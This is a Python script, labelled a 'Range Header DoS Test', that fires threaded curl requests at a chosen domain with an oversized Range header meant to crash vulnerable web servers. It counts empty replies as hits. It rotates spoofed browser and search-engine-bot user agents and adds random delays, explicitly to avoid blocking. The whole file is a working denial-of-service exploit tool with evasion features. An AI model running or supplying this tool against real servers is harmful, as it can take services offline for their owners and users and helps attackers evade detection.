#!/usr/bin/env python3
import argparse
import subprocess
import random
import concurrent.futures
import os
import re
import datetime
import time

user_agents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 Chrome/90.0.4430.212 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/14.0 Safari/605.1.15',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/110.0.0.0 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 Version/14.0 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 Chrome/95.0.4638.74 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; SM-G970F) AppleWebKit/537.36 Chrome/88.0.4324.93 Mobile Safari/537.36',
    'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
    'Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)',
    'curl/7.85.0',
    'Wget/1.21.1',
    'Mozilla/5.0 (Windows NT 6.3; WOW64) Gecko/20100101 Firefox/89.0',
    'Mozilla/5.0 (Linux; Android 9; Redmi Note 7) AppleWebKit/537.36 Chrome/74.0.3729.136 Mobile Safari/537.36',
    'Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X) AppleWebKit/605.1.15 Version/14.0 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 11_0) AppleWebKit/537.36 Chrome/87.0.4280.88 Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; SM-A505F) AppleWebKit/537.36 Chrome/83.0.4103.106 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 8.1.0; C210AE) AppleWebKit/537.36 Chrome/68.0.3440.91 Mobile Safari/537.36',
    'Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)',
    'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)',
    'Mozilla/5.0 (compatible; DuckDuckBot/1.0; +http://duckduckgo.com/duckduckbot)'
]
accept_language = [
    'Accept-Language: en-US,en;q=0.9',
    'Accept-Language: en-GB,en;q=0.8',
    'Accept-Language: en;q=0.5',
    'Accept-Language: vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
    'Accept-Language: fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7',
    'Accept-Language: de-DE,de;q=0.9,en-US;q=0.8,en;q=0.7',
    'Accept-Language: es-ES,es;q=0.9,en-US;q=0.8,en;q=0.7',
    'Accept-Language: ja-JP,ja;q=0.9,en-US;q=0.8,en;q=0.7',
    'Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7',
    'Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7',
    'Accept-Language: it-IT,it;q=0.9,en-US;q=0.8,en;q=0.7',
    'Accept-Language: th-TH,th;q=0.9,en-US;q=0.8,en;q=0.7',
    'Accept-Language: nl-NL,nl;q=0.9,en-US;q=0.8,en;q=0.7',
    'Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
    'Accept-Language: tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
    'Accept-Language: pl-PL,pl;q=0.9,en-US;q=0.8,en;q=0.7',
    'Accept-Language: ro-RO,ro;q=0.9,en-US;q=0.8,en;q=0.7',
    'Accept-Language: hi-IN,hi;q=0.9,en-US;q=0.8,en;q=0.7'
]  
def sanitize_filename(domain, dt_str=None):
    filename = re.sub(r'^https?://', '', domain)
    filename = re.sub(r'[^a-zA-Z0-9._-]', '_', filename)
    if dt_str:
        filename += f'_{dt_str}'
    return filename + '.txt'

def make_request(domain, log_path=None, random_delay=False):
    if random_delay:
        delay = random.choice([1, 1.5, 2, 2.5, 3, 3.5, 4])
        time.sleep(delay)
    ua = random.choice(user_agents)
    al = random.choice(accept_language)
    payload = "Range: bytes=0-18446744073709551615"
    cmd = [
        "curl", "-s", "-v",
        "-A", ua,
        "-H", al,
        "-H", "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "-H", "Accept-Encoding: gzip, deflate, br",
        "-H", "Connection: keep-alive",
        "-H", "Upgrade-Insecure-Requests: 1",
        "-H", "Sec-Fetch-Dest: document",
        "-H", "Sec-Fetch-Mode: navigate",
        "-H", "Sec-Fetch-Site: none",
        "-H", "Sec-Fetch-User: ?1",
        "-H", payload,
        domain
    ]
    try:
        result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, timeout=10)
        output = result.stdout.decode()
        if "Empty reply from server" in output:
            if log_path:
                with open(log_path, 'a') as f:
                    f.write(f"--- EMPTY REPLY ---\n{output}\n\n")
            return "EMPTY"
        return "OK"
    except Exception as e:
        return "ERROR"

def main():
    parser = argparse.ArgumentParser(description="Range Header DoS Test via curl")
    parser.add_argument("-d", "--domain", required=True, help="Target domain (e.g., https://example.com)")
    parser.add_argument("-t", "--threads", type=int, default=1, help="Number of concurrent threads")
    parser.add_argument("-r", "--requests", type=int, default=1, help="Total number of requests to send")
    parser.add_argument("--random-delay", action="store_true", help="Random delay (1-4s) before each request to avoid blocking")
    args = parser.parse_args()

    print(f"[*] Target: {args.domain}")
    print(f"[*] Sending {args.requests} requests with {args.threads} thread(s)...")
    if args.random_delay:
        print(f"[*] Random delay enabled: Each request will sleep randomly between 1 and 4 seconds.")

    log_dir = os.path.join(os.path.dirname(__file__), 'log')
    os.makedirs(log_dir, exist_ok=True)
    dt_str = datetime.datetime.now().strftime('%Y%m%d_%H%M%S')
    log_path = os.path.join(log_dir, sanitize_filename(args.domain, dt_str=dt_str))

    def req(_):
        return make_request(args.domain, log_path=log_path, random_delay=args.random_delay)

    with concurrent.futures.ThreadPoolExecutor(max_workers=args.threads) as executor:
        results = list(executor.map(req, range(args.requests)))

    empty_count = results.count("EMPTY")
    ok_count = results.count("OK")
    error_count = results.count("ERROR")

    print(f"[*] Total: {len(results)}")
    print(f"[!] Empty replies: {empty_count}")
    print(f"[+] Normal responses: {ok_count}")
    print(f"[x] Errors: {error_count}")

if __name__ == "__main__":
    main()